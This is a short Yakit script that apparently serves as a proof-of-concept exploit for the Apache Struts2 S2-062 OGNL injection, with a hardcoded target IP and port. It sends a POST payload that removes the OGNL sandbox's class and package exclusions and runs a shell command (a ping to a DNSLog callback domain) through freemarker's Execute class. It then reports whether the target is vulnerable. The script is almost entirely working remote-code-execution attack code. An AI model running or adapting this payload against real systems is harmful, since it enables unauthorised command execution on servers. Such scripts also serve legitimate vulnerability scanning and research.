yakit.AutoInitYakit()

domain, token, err = risk.NewDNSLogDomain()

if err != nil {
    die(err)
}

host = [
    "123.58.236.76:14224",
]

res, err = httpool.Pool(`POST /s2_062/index.action HTTP/1.1
Host: {{params(host)}}
Content-Type: application/x-www-form-urlencoded

name={{url((#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'ping {{params(domain)}}'})))}}

`, httpool.fuzzParams({"host": host, "domain": domain}))
// die(err)

loglevel("info")
for result = range res {
    yakit.Info("[+]开始检测")
    header, body = poc.Split(result.ResponseRaw)
    dnslogss, errDns = risk.CheckDNSLogByToken(token)
    // println(dnslogss)
    if result.Response != nil {
        if errDns != nil {
        yakit.Error("[-]不存在漏洞")
        println(errDns)
        }else{
        yakit.Info("[+]存在漏洞")
        yakit.Info("URL: %v", result.Url)
        }
    }
}